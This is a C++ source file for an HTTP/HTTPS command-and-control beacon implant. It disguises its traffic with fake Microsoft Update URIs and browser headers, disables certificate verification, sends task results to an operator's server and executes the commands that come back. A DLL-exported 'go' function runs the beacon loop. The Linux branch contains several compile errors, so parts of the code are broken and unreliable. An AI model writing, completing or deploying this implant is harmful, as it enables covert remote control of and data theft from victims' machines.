#include "BeaconHttp.hpp"


#ifdef __linux__

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "../thirdParty/cpp-httplib/httplib.h"

#elif _WIN32

#include <WinHttp.h>
#pragma comment(lib, "winhttp.lib")

#endif


using namespace std;


json BeaconHttpConfig = {
	{"http-post", {
		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
		{"client", {
			{"headers", {
                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
                {"Content-Type","text/plain;charset=UTF-8"},
                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
                {"Keep-Alive", "timeout=5, max=1000"},
                {"Connection","Keep-Alive"},
                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
                {"Accept","*/*"},
                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
                {"Sec-Ch-Ua-Platform","Windows"}
            }}
		}},
		{"server", {
			{"headers", {
                {"Access-Control-Allow-Origin", "true"},
                {"Connection","Keep-Alive"},
                {"Content-Type","application/json"},
                {"Server","Server"},
                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
            }}
		}}
  	}},
	{"https-post", {
		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
		{"client", {
			{"headers", {
                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
                {"Content-Type","text/plain;charset=UTF-8"},
                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
                {"Keep-Alive", "timeout=5, max=1000"},
                {"Connection","Keep-Alive"},
                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
                {"Accept","*/*"},
                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
                {"Sec-Ch-Ua-Platform","Windows"}
            }}
		}},
		{"server", {
			{"headers", {
                {"Access-Control-Allow-Origin", "true"},
                {"Connection","Keep-Alive"},
                {"Content-Type","application/json"},
                {"Server","Server"},
                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
            }}
		}}
  	}}
};



#ifdef __linux__

using namespace httplib;

#elif _WIN32

std::wstring getUtf16(const std::string& str, int codepage)
{
    if (str.empty()) 
        return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}


string HttpsWebRequestPost(const string& domain, int port, const string& url, const string& data, bool isHttps)
{
    wstring sdomain = getUtf16(domain, CP_UTF8);
    wstring surl = getUtf16(url, CP_UTF8);

    DWORD dwSize = 0;
    
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME,
                            WINHTTP_NO_PROXY_BYPASS, 
                            0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, 
                                    sdomain.c_str(), 
                                    port, 
                                    0);

    // Create an HTTP request handle.
    DWORD dwFlags = 0;
    if(isHttps)
    {
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;
    }

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, 
                                        L"POST", 
                                        surl.c_str(),
                                        NULL, 
                                        WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        dwFlags);

    // Add a request header.
    if( hRequest )
    {
        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
        if(isHttps)
            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];

        for (auto& it : httpHeaders.items())
        {
            std::string newHeader = (it).key();
            newHeader+=":";
            newHeader+=(it).value();

            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());

            bResults = WinHttpAddRequestHeaders( hRequest, 
                                                stemp.c_str(),
                                                (ULONG)-1L,
                                                WINHTTP_ADDREQ_FLAG_ADD );
        }
    }

    if(isHttps)
    {
        // if https & self sign certificat
        dwFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    // // Debug proxy configuration
    // // https://stackoverflow.com/questions/35082021/code-to-send-an-http-request-through-a-proxy-using-winhttp
    // // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
    // WINHTTP_PROXY_INFO proxy = { 0 };
    // proxy.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    // proxy.lpszProxy = L"http://127.0.0.1:8080";
    // WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxy, sizeof(proxy));

    // Post data
    LPSTR pdata = const_cast<char*>(data.c_str());;
    DWORD lenData = data.size();

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 
            0,
            (LPVOID)pdata,
            lenData,
            lenData,
            0);

    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwStatusCode = 0;
    dwSize = sizeof(dwStatusCode);

    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

    // Keep checking for data until there is nothing left.
    string response;
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
                // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
			}

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                // printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				{
                    // printf("Error %u in WinHttpReadData.\n", GetLastError());
				}
                else
                {
                    //printf("%s", pszOutBuffer);
                    response = response + string(pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    // Report any errors.
    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) 
        WinHttpCloseHandle(hRequest);
    if (hConnect) 
        WinHttpCloseHandle(hConnect);
    if (hSession) 
        WinHttpCloseHandle(hSession);

    return response;
}

#endif



BeaconHttp::BeaconHttp(std::string& ip, int port, bool isHttps)
	: Beacon(ip, port)
    , m_isHttps(isHttps)
{
}


BeaconHttp::~BeaconHttp()
{
}


void BeaconHttp::checkIn()
{
    
#ifdef __linux__

    if(m_isHttps)
    {
        httplib::SSLClient cli(m_ip, m_port);
	    cli.enable_server_certificate_verification(false);

        std::string output;
        taskResultsToCmd(output);

        auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
        srand(time(NULL));
        std::string httpsUri = httpsUri[ rand() % httpUri.size() ];

        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
        if(m_isHttps)
            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];

        httplib::Headers httpClientHeaders;
        for (auto& it : httpHeaders.items())
            httpClientHeaders.insert({(it).key(), (it).value()});
        res.headers = httpClientHeaders;

        if (auto res = cli.Post(httpsUri, httpClientHeaders, output)
        {
            if (res->status == 200) 
            {
                std::string input = res->body;
                if(!input.empty())
                {
                    cmdToTasks(input);
                }
            }
        }
    }
    else
    {
        httplib::Client cli(m_ip, m_port);

        std::string output;
        taskResultsToCmd(output);

        auto httpUri = BeaconHttpConfig["http-post"]["uri"];
        srand(time(NULL));
        std::string endPoint = httpUri[ rand() % httpUri.size() ];

        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
        if(m_isHttps)
            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];

        httplib::Headers httpClientHeaders;
        for (auto& it : httpHeaders.items())
            httpClientHeaders.insert({(it).key(), (it).value()});
        res.headers = httpClientHeaders;

        if (auto res = cli.Post(endPoint, httpClientHeaders, output))
        {
            if (res->status == 200) 
            {
                std::string input = res->body;
                if(!input.empty())
                {
                    cmdToTasks(input);
                }
            }
        }
    }

#elif _WIN32

    std::string endPoint;

    if(m_isHttps)
    {
        auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
        
        srand(time(NULL));
        endPoint = httpsUri[ rand() % httpsUri.size() ];
    }
    else
    {
        auto httpUri = BeaconHttpConfig["http-post"]["uri"];

        srand(time(NULL));
        endPoint = httpUri[ rand() % httpUri.size() ];
    }

	std::string output;
	taskResultsToCmd(output);

    std::string input = HttpsWebRequestPost(m_ip, m_port, endPoint, output, m_isHttps);

    if (!input.empty())
    {
        cmdToTasks(input);
    }

#endif


}


#ifdef __linux__
#elif _WIN32

extern "C" __declspec(dllexport) int go(PCHAR argv)
{
    // OutputDebugStringA("HelperFunc was executed");
    // OutputDebugStringA(argv);

    std::vector<std::string> splitedCmd;
    std::string delimiter = " ";
    splitList(argv, delimiter, splitedCmd);

    // OutputDebugStringA(splitedCmd[0].c_str());
    // OutputDebugStringA(splitedCmd[1].c_str());
    // OutputDebugStringA(splitedCmd[2].c_str());

    if (splitedCmd.size() == 3)
    {
        std::string ip = splitedCmd[0];
        int port = -1;
        try
        {
            port = stoi(splitedCmd[1]);
        }
        catch (...)
        {
            return 1;
        }

        bool https = true;
		std::string sHttps = splitedCmd[2];
		if(sHttps=="https")
			https=true;

        std::unique_ptr<Beacon> beacon;
        beacon = make_unique<BeaconHttp>(ip, port, https);

        bool exit = false;
        while (!exit)
        {
            beacon->checkIn();

            exit = beacon->runTasks();

            beacon->sleep();
        }

        beacon->checkIn();
    }

    return 0;
}

#endif